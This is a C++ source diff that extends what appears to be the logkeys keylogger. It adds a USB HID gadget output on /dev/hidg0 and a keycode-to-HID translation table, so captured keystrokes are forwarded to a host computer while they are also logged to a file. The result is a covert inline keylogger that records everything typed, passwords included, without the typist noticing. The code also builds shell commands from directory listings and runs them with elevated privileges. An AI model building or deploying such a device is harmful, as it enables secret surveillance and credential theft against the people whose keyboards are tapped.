@@ -24,6 +24,13 @@
 #include <sys/stat.h>
 #include <sys/socket.h>
 #include <linux/input.h>
+//ADDED
+//#include <X11/Xlib.h>
+//#include <stdio.h>
+//#include <X11/X.h>
+//#include <X11/Intrinsic.h>
+//#include <X11/StringDefs.h>
+//END
 
 #ifdef HAVE_CONFIG_H
 # include <config.h>  // include config produced from ./configure
@@ -49,7 +56,9 @@
 #define COMMAND_STR_DUMPKEYS ( EXE_DUMPKEYS " -n | " EXE_GREP " '^\\([[:space:]]shift[[:space:]]\\)*\\([[:space:]]altgr[[:space:]]\\)*keycode'" )
 #define COMMAND_STR_GET_PID  ( (std::string(EXE_PS " ax | " EXE_GREP " '") + program_invocation_name + "' | " EXE_GREP " -v grep").c_str() )
 #define COMMAND_STR_CAPSLOCK_STATE ("{ { xset q 2>/dev/null | grep -q -E 'Caps Lock: +on'; } || { setleds 2>/dev/null | grep -q 'CapsLock on'; }; } && echo on")
+#define COMMAND_STR_NUMLOCK_STATE ("{ { xset q 2>/dev/null | grep -q -E 'Num Lock: +on'; } || { setleds 2>/dev/null | grep -q 'NumLock on'; }; } && echo on")
 
+//ADDED by-path/ - REMOVED with new start script
 #define INPUT_EVENT_PATH  "/dev/input/"  // standard path
 #define DEFAULT_LOG_FILE  "/var/log/logkeys.log"
 #define PID_FILE          "/var/run/logkeys.pid"
@@ -78,6 +87,8 @@ std::string execute(const char* cmd)
 
 
 int input_fd = -1;  // input event device file descriptor; global so that signal_handler() can access it
+//ADDED
+int output_fd = -1;
 
 void signal_handler(int signal)
 {
@@ -369,11 +380,393 @@ void determine_input_device()
   seteuid(0); setegid(0);
 }
 
+//ADDED function
+int translate_code(int inputkey)
+{
+	switch(inputkey) {
+            // Numbers 1-0
+			case 2 :
+            return 0x1e;
+            break;
+            case 3 :
+            return 0x1f;
+            break;
+            case 4 :
+            return 0x20;
+            break;
+            case 5 :
+            return 0x21;
+            break;
+            case 6 :
+            return 0x22;
+            break;
+            case 7 :
+            return 0x23;
+            break;
+            case 8 :
+            return 0x24;
+            break;
+            case 9 :
+            return 0x25;
+            break;
+            case 10 :
+            return 0x26;
+            break;
+            case 11 :
+            return 0x27;
+            break;
+            //BACKSPACE
+            case 14 :
+            return 0x2a;
+            break;
+			//Delete
+			case 111 :
+            return 0x4c;
+            break;
+			//Escape
+			case 1 :
+			return 0x29;
+			break;
+            //TAB
+            case 15 :
+            return 0x2b;
+            break;
+            //keyboard top row q-p
+            case 16 :
+            return 0x14;
+            break;
+            case 17 :
+            return 0x1a;
+            break;
+            case 18 :
+            return 0x08;
+            break;
+            case 19 :
+            return 0x15;
+            break;
+            case 20 :
+            return 0x17;
+            break;
+            case 21 :
+            return 0x1c;
+            break;
+            case 22 :
+            return 0x18;
+            break;
+            case 23 :
+            return 0x0c;
+            break;
+            case 24 :
+            return 0x12;
+            break;
+            case 25 :
+            return 0x13;
+            break;
+            //ENTER
+            case 28 :
+            return 0x28;
+            break;
+            //keyboard middle row a-l
+            case 30 :
+            return 0x04;
+            break;
+            case 31 :
+            return 0x16;
+            break;
+            case 32 :
+            return 0x07;
+            break;
+            case 33 :
+            return 0x09;
+            break;
+            case 34 :
+            return 0x0a;
+            break;
+            case 35 :
+            return 0x0b;
+            break;
+            case 36 :
+            return 0x0d;
+            break;
+            case 37 :
+            return 0x0e;
+            break;
+            case 38 :
+            return 0x0f;
+            break;
+            
+            //KEYBOARD bottom row z-m
+            case 44 :
+            return 0x1d;
+            break;
+            case 45 :
+            return 0x1b;
+            break;
+            case 46 :
+            return 0x06;
+            break;
+            case 47 :
+            return 0x19;
+            break;
+            case 48 :
+            return 0x05;
+            break;
+            case 49 :
+            return 0x11;
+            break;
+            case 50 :
+            return 0x10;
+            break;
+            case 57 :
+            return 0x2c;
+            break;
+            //NUMPAD 7-9
+            case 71 :
+            return 0x5f;
+            break;
+            case 72 :
+            return 0x60;
+            break;
+            case 73 :
+            return 0x61;
+            break;
+            //KPMINUS
+            case 74 :
+            return 0x56;
+            break;
+            //NUMPAD 4-6
+            case 75 :
+            return 0x5c;
+            break;
+            case 76 :
+            return 0x5d;
+            break;
+            case 77 :
+            return 0x5e;
+            break;
+            //KPPLUS
+            case 78 :
+            return 0x57;
+            break;
+            //NUMPAD 1,2,3,0
+            case 79 :
+            return 0x59;
+            break;
+            case 80 :
+            return 0x5a;
+            break;
+            case 81 :
+            return 0x5b;
+            break;
+            case 82 :
+            return 0x62;
+            break;
+            //KPDOT
+            case 83 :
+            return 0x63;
+            break;
+            //KPENTER
+            case 96 :
+            return 0x58;
+            break;
+			//Function Keys
+			//LCTRL
+			case 29:
+			return 0x00;
+			break;
+			//LSHIFT
+			case 42:
+			return 0x00;
+			break;
+			//LALT
+			case 56:
+			return 0x00;
+			break;
+			//RCTRL
+			case 97:
+			return 0x00;
+			break;
+			//RSHIFT
+			case 54:
+			return 0x00;
+			break;
+			//RALT
+			case 100:
+			return 0x00;
+			break;
+			//SYMBOLS
+			//MINUS
+			case 12:
+			return 0x2d;
+			break;
+			//equal
+			case 13:
+			return 0x2e;
+			break;
+			//leftbrace
+			case 26:
+			return 0x2f;
+			break;
+			//rightbrace
+			case 27:
+			return 0x30;
+			break;
+			//backslash
+			case 43:
+			return 0x31;
+			break;
+			//semicolon
+			case 39:
+			return 0x33;
+			break;
+			//apostrophe
+			case 40:
+			return 0x34;
+			break;
+			//comma
+			case 51:
+			return 0x36;
+			break;
+			//dot
+			case 52:
+			return 0x37;
+			break;
+			//slash
+			case 53:
+			return 0x38;
+			break;
+			//grave `
+			case 41:
+			return 0x35;
+			break;
+			//F-Keys
+			//F1
+			case 59:
+			return 0x3a;
+			break;
+			//F2
+			case 60:
+			return 0x3b;
+			break;
+			//F3
+			case 61:
+			return 0x3c;
+			break;
+			//F4
+			case 62:
+			return 0x3d;
+			break;
+			//F5
+			case 63:
+			return 0x3e;
+			break;
+			//F6
+			case 64:
+			return 0x3f;
+			break;
+			//F7
+			case 65:
+			return 0x40;
+			break;
+			//F8
+			case 66:
+			return 0x41;
+			break;
+			//F9
+			case 67:
+			return 0x42;
+			break;
+			//F10
+			case 68:
+			return 0x43;
+			break;
+			//F11
+			case 87:
+			return 0x44;
+			break;
+			//F12
+			case 88:
+			return 0x45;
+			break;
+			//specials
+			//HOME
+			case 102:
+			return 0x4a;
+			break;
+			//END
+			case 107:
+			return 0x4d;
+			break;
+			//PGUP
+			case 104:
+			return 0x4b;
+			break;
+			//PGDOWN
+			case 109:
+			return 0x4e;
+			break;
+			//prtscr
+			case 99:
+			return 0x46;
+			break;
+			//ARROWS
+			//up
+			case 103:
+			return 0x52;
+			break;
+			//down
+			case 108:
+			return 0x51;
+			break;
+			//left
+			case 105:
+			return 0x50;
+			break;
+			//right
+			case 106:
+			return 0x4f;
+			break;
+			//META - Windows key
+			//left meta
+			case 125:
+			return 0x00;
+			break;
+			//right meta
+			case 126:
+			return 0x00;
+			break;
+			//CapsLock
+			case 58:
+			return 0x39;
+			break;
+			//NumLock
+			case 69:
+			return 0x53;
+			break;
+			//ScrollLock
+			case 70:
+			return 0x47;
+			break;
+			//Pause
+			case 119:
+			return 0x48;
+			break;
+			
+            default :
+            return 0x0f;
+          }
+
+}
 
 int main(int argc, char **argv)
 {  
   on_exit(exit_cleanup, NULL);
-  
+  //ADDED
+  //Display  *disp;
+  //disp = XOpenDisplay(":0");
+  //XGrabKeyboard(disp, DefaultRootWindow(disp), TRUE, GrabModeAsync,GrabModeAsync, CurrentTime);
+  //XGrabPointer(disp, DefaultRootWindow(disp), TRUE, 0,GrabModeAsync,GrabModeAsync, None, None, CurrentTime);
+  //END
 
   args.logfile = (char*) DEFAULT_LOG_FILE;  // default log file will be used if none specified
   
@@ -435,6 +828,26 @@ int main(int argc, char **argv)
   if (input_fd == -1) {
     error(EXIT_FAILURE, errno, "Error opening input event device '%s'", args.device.c_str());
   }
+
+  //ADDED KEYOUT DEVICE
+  static const char *DEV_KEYBOARD = "/dev/hidg0";
+  output_fd = open(DEV_KEYBOARD, O_WRONLY);
+  FILE * client_fd;
+    if (output_fd == -1) {
+    error(EXIT_FAILURE, errno, "Error opening output device '%s'", DEV_KEYBOARD);
+  }
+  client_fd=fopen ("/dev/hidg0","r");
+  if (client_fd==NULL) perror ("Error opening file");
+  else
+	  {
+		int fd = fileno(client_fd);	  
+	    int flags;
+	    flags = fcntl(fd, F_GETFL, 0);
+	    flags |= O_NONBLOCK;
+	    fcntl(fd, F_SETFL, flags);
+      }
+  
+  //END OF ADDITION
   
   // if log file is other than default, then better seteuid() to the getuid() in order to ensure user can't write to where she shouldn't!
   if (args.logfile == DEFAULT_LOG_FILE) {
@@ -445,6 +858,7 @@ int main(int argc, char **argv)
   // open log file (if file doesn't exist, create it with safe 0600 permissions)
   umask(0177);
   FILE *out = NULL;
+  
   if (args.logfile == "-") {
     out = stdout;
   }
@@ -475,11 +889,18 @@ int main(int argc, char **argv)
   unsigned int scan_code, prev_code = 0;  // the key code of the pressed key (some codes are from "scan code set 1", some are different (see <linux/input.h>)
   struct input_event event;
   char timestamp[32];  // timestamp string, long enough to hold format "\n%F %T%z > "
-  bool capslock_in_effect = execute(COMMAND_STR_CAPSLOCK_STATE).size() >= 2;
+  //bool capslock_in_effect = execute(COMMAND_STR_CAPSLOCK_STATE).size() >= 2;
+  bool capslock_in_effect = false;
   bool shift_in_effect = false;
   bool altgr_in_effect = false;
   bool ctrl_in_effect = false;  // used for identifying Ctrl+C / Ctrl+D
+  bool meta_in_effect = false;
   int count_repeats = 0;  // count_repeats differs from the actual number of repeated characters! afaik, only the OS knows how these two values are related (by respecting configured repeat speed and delay)
+  //ADDED
+  char ledlocation[100];
+  char leds[32];
+  uint8_t output_code[8] = {0,0,0,0,0,0,0,0};
+  uint8_t output_null[8] = {0,0,0,0,0,0,0,0};
   
   struct stat st;
   stat(args.logfile.c_str(), &st);
@@ -504,7 +925,89 @@ int main(int argc, char **argv)
 #define EV_MAKE   1  // when key pressed
 #define EV_BREAK  0  // when key released
 #define EV_REPEAT 2  // when key switches to repeating after short delay
-    
+    //ADDED
+    //uint8_t output_code[8] = {0,0,0,0,0,0,0,0};
+    //uint8_t output_null[8] = {0,0,0,0,0,0,0,0};
+	//POLLING FOR OUTPUT REPORTS (CURRENT LED STATUS)
+	int c;
+	c = fgetc (client_fd);
+	//LOGGING
+    if (c >= 0) {
+	fprintf (out,"The file contains the value %d.\n",c);
+	//fprintf (out,"bitwise and 1 %d\n",c&1);
+	//fprintf (out,"bitwise and 2 %d\n",c&2);
+	//fprintf (out,"bitwise and 4 %d\n",c&4);
+	if ( (c & 1) == 1) {
+		//num lock on
+		fprintf (out,"num lock on\n");
+		strcpy(leds,execute("cd /sys/class/leds && ls -d *numlock").c_str());
+		leds[strlen(leds)-1] = '\0';
+		strcpy(ledlocation, "echo 1 > /sys/class/leds/");
+		strcat(ledlocation, leds);
+		strcat(ledlocation,"/brightness");
+		fprintf(out, "Output code (ledlocation):%s\n", ledlocation);
+		execute(ledlocation);
+	}
+	else {
+		strcpy(leds,execute("cd /sys/class/leds && ls -d *numlock").c_str());
+		leds[strlen(leds)-1] = '\0';
+		strcpy(ledlocation, "echo 0 > /sys/class/leds/");
+		strcat(ledlocation, leds);
+		strcat(ledlocation,"/brightness");
+		fprintf(out, "Output code (ledlocation):%s\n", ledlocation);
+		execute(ledlocation);
+	}
+	
+	if ((c & 2) == 2) {
+		//caps lock on
+		fprintf (out,"caps lock on\n");
+		strcpy(leds,execute("cd /sys/class/leds && ls -d *capslock").c_str());
+		leds[strlen(leds)-1] = '\0';
+		strcpy(ledlocation, "echo 1 > /sys/class/leds/");
+		strcat(ledlocation, leds);
+		strcat(ledlocation,"/brightness");
+		fprintf(out, "Output code (ledlocation):%s\n", ledlocation);
+		execute(ledlocation);
+		capslock_in_effect = true;
+	}
+	else {
+		strcpy(leds,execute("cd /sys/class/leds && ls -d *capslock").c_str());
+		leds[strlen(leds)-1] = '\0';
+		strcpy(ledlocation, "echo 0 > /sys/class/leds/");
+		strcat(ledlocation, leds);
+		strcat(ledlocation,"/brightness");
+		fprintf(out, "Output code (ledlocation):%s\n", ledlocation);
+		execute(ledlocation);
+		capslock_in_effect = false;
+	}
+	
+	if ((c & 4) == 4) {
+		//scroll lock on
+		fprintf (out,"scroll lock on\n");
+		strcpy(leds,execute("cd /sys/class/leds && ls -d *scrolllock").c_str());
+		leds[strlen(leds)-1] = '\0';
+		strcpy(ledlocation, "echo 1 > /sys/class/leds/");
+		strcat(ledlocation, leds);
+		strcat(ledlocation,"/brightness");
+		fprintf(out, "Output code (ledlocation):%s\n", ledlocation);
+		execute(ledlocation);
+	}
+	else {
+		strcpy(leds,execute("cd /sys/class/leds && ls -d *scrolllock").c_str());
+		leds[strlen(leds)-1] = '\0';
+		strcpy(ledlocation, "echo 0 > /sys/class/leds/");
+		strcat(ledlocation, leds);
+		strcat(ledlocation,"/brightness");
+		fprintf(out, "Output code (ledlocation):%s\n", ledlocation);
+		execute(ledlocation);
+	}
+	
+	if ((c & 7) == 0) {
+		fprintf (out,"no leds on\n");
+	}
+	}
+	
+	
     if (event.type != EV_KEY) continue;  // keyboard events are always of type EV_KEY
     
     inc_size = 0;
@@ -558,13 +1061,22 @@ int main(int argc, char **argv)
     // on key repeat ; must check before on key press
     if (event.value == EV_REPEAT) {
       ++count_repeats;
+      //ADDED - not quite perfect, but a start
+      if (is_char_key(scan_code)) {
+        //fprintf(out, "Repeat code:%d\n", scan_code);
+        output_code[2] = translate_code(scan_code);          
+        write(output_fd, output_code, 8);
+        //write(output_fd, output_null, 8);
+      }
     } else if (count_repeats) {
       if (prev_code == KEY_RIGHTSHIFT || prev_code == KEY_LEFTCTRL || 
           prev_code == KEY_RIGHTALT   || prev_code == KEY_LEFTALT  || 
           prev_code == KEY_LEFTSHIFT  || prev_code == KEY_RIGHTCTRL);  // if repeated key is modifier, do nothing
       else {
         if ((args.flags & FLAG_NO_FUNC_KEYS) && is_func_key(prev_code));  // if repeated was function key, and if we don't log function keys, then don't log repeat either
-        else inc_size += fprintf(out, "<#+%d>", count_repeats);
+        else {
+          inc_size += fprintf(out, "<#+%d>", count_repeats);
+        }
       }
       count_repeats = 0;  // reset count for future use
     }
@@ -577,25 +1089,44 @@ int main(int argc, char **argv)
           (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
         if (ctrl_in_effect)
           inc_size += fprintf(out, "%lc", char_keys[to_char_keys_index(scan_code)]);  // log C or D
-        if (args.flags & FLAG_NO_TIMESTAMPS)
+        if (args.flags & FLAG_NO_TIMESTAMPS) {
           inc_size += fprintf(out, "\n");
+          //ADDED
+          //fprintf(out, "Enter code:%d\n", scan_code);
+          output_code[2] = translate_code(scan_code);          
+          write(output_fd, output_code, 8);
+          //write(output_fd, output_null, 8);
+        }
         else {
           strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&event.time.tv_sec));
           inc_size += fprintf(out, "%s", timestamp);  // then newline and timestamp
+          //ADDED
+          //fprintf(out, "Enter code:%d\n", scan_code);
+          output_code[2] = translate_code(scan_code);         
+          write(output_fd, output_code, 8);
+          //write(output_fd, output_null, 8);
         }
         if (inc_size > 0) file_size += inc_size;
         continue;  // but don't log "<Enter>"
       }
       
-      if (scan_code == KEY_CAPSLOCK)
-        capslock_in_effect = !capslock_in_effect;
+      if (scan_code == KEY_CAPSLOCK) {
+		  //capslock_in_effect = !capslock_in_effect;
+		  //fprintf(out, "Output code (capslock):%d\n", capslock_in_effect);
+		  
+		  if (capslock_in_effect == false && shift_in_effect == false)
+			  output_code[0] = output_code[0] & 0x0d;
+		  //fprintf(out, "Output code (capslock):%d\n", output_code[0]);
+	  }
 
       if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
         shift_in_effect = true;
-      if (scan_code == KEY_RIGHTALT)
+      if (scan_code == KEY_RIGHTALT || scan_code == KEY_LEFTALT)
         altgr_in_effect = true;
       if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
         ctrl_in_effect = true;
+	  if (scan_code == KEY_LEFTMETA || scan_code == KEY_RIGHTMETA)
+		meta_in_effect = true;
       
       // print character or string coresponding to received keycode; only print chars when not \0
       if (is_char_key(scan_code)) {
@@ -627,14 +1158,65 @@ int main(int argc, char **argv)
         else  // neither altgr nor shift are effective, this is a normal char
           wch = char_keys[to_char_keys_index(scan_code)];
         
-        if (wch != L'\0') inc_size += fprintf(out, "%lc", wch);  // write character to log file
+        if (wch != L'\0') {
+          inc_size += fprintf(out, "%lc", wch);  // write character to log file
+          //ADDED KEYOUT PRINT
+          //fprintf(out, "\\%x\\%x\\x%x\\%x\\%x\\%x\\%x\\%x", 0,0,21,0,0,0,0,0);
+          //sprintf(cmd, "\\%x\\%x\\x%x\\%x\\%x\\%x\\%x\\%x", 0,0,21,0,0,0,0,0);
+          //fprintf(out, "Input code:%d\n", scan_code);
+		  if (is_char_key(scan_code)) {
+
+			output_code[2] = translate_code(scan_code);          
+          
+			//printf("%d", scan_code);
+			if (shift_in_effect) //|| capslock_in_effect)
+			  output_code[0] = output_code[0] | 0x02;
+			if (ctrl_in_effect)
+				output_code[0] = output_code[0] | 0x01;
+			if (altgr_in_effect)
+				output_code[0] = output_code[0] | 0x04;
+			if (meta_in_effect)
+				output_code[0] = output_code[0] | 0x08;
+			//fprintf(out, "Output code (char):%d\n", output_code[0]);
+			write(output_fd, output_code, 8);
+			//sprintf(cmd, "\\%x\\%x\\%x\\%x\\%x\\%x\\%x\\%x", 0,0,0,0,0,0,0,0);
+			//write(output_fd, output_null, 8);
+		  }
+        }
+
       }
       else if (is_func_key(scan_code)) {
         if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  // only log function keys if --no-func-keys not requested
-          inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
+			inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
+			//ADDED not quite right for numlock on or off
+			//fprintf(out, "Enter code (func):%d\n", scan_code);
+			//ADDED - HANDLE SHIFT,ALT, and CTRL elsewhere...do not ouput directly.
+			if (shift_in_effect) //|| capslock_in_effect) 
+			  output_code[0] = output_code[0] | 0x02;
+			if (ctrl_in_effect)
+				output_code[0] = output_code[0] | 0x01;
+			if (altgr_in_effect)
+				output_code[0] = output_code[0] | 0x04;
+			if (meta_in_effect)
+				output_code[0] = output_code[0] | 0x08;
+			//if (scan_code == KEY_CAPSLOCK)
+				//output_code[0] = output_code[0] & 0x0d;
+			//if (!(shift_in_effect || altgr_in_effect || ctrl_in_effect)) {
+			//fprintf(out, "Output code (func):%d\n", output_code[0]);
+			output_code[2] = translate_code(scan_code);          
+			write(output_fd, output_code, 8);
+			//write(output_fd, output_null, 8);
+			//}
         } 
         else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) {
           inc_size += fprintf(out, " ");  // but always log a single space for Space and Tab keys
+          //ADDED
+          fprintf(out, "Enter code (space or tab):%d\n", scan_code);
+		  if (altgr_in_effect)
+			output_code[0] = output_code[0] | 0x04;
+          output_code[2] = translate_code(scan_code);          
+          write(output_fd, output_code, 8);
+          //write(output_fd, output_null, 8);
         }
       }
       else inc_size += fprintf(out, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
@@ -642,12 +1224,31 @@ int main(int argc, char **argv)
     
     // on key release
     if (event.value == EV_BREAK) {
-      if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
-        shift_in_effect = false;
-      if (scan_code == KEY_RIGHTALT)
-        altgr_in_effect = false;
-      if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
+      //ADDED
+      if (is_char_key(scan_code) || is_func_key(scan_code))
+        output_code[2] = 0x00;
+	  write(output_fd, output_code, 8);
+		//END
+      if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL) {
         ctrl_in_effect = false;
+		output_code[0] = output_code[0] & 0x0e;
+		write(output_fd, output_code, 8);
+	  }
+	  if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT) {
+        shift_in_effect = false;
+		output_code[0] = output_code[0] & 0x0d;
+		write(output_fd, output_code, 8);
+	  }
+      if (scan_code == KEY_RIGHTALT || scan_code == KEY_LEFTALT) {
+        altgr_in_effect = false;
+		output_code[0] = output_code[0] & 0x0b;
+		write(output_fd, output_code, 8);
+	  }
+      if (scan_code == KEY_LEFTMETA || scan_code == KEY_RIGHTMETA) {
+		meta_in_effect = false;
+		output_code[0] = output_code[0] & 0x07;
+		write(output_fd, output_code, 8);
+	  }
     }
     
     prev_code = scan_code;
@@ -662,6 +1263,7 @@ int main(int argc, char **argv)
   fprintf(out, "\n\nLogging stopped at %s\n\n", timestamp);
   
   fclose(out);
+  close(output_fd);
   
   remove(PID_FILE);
   
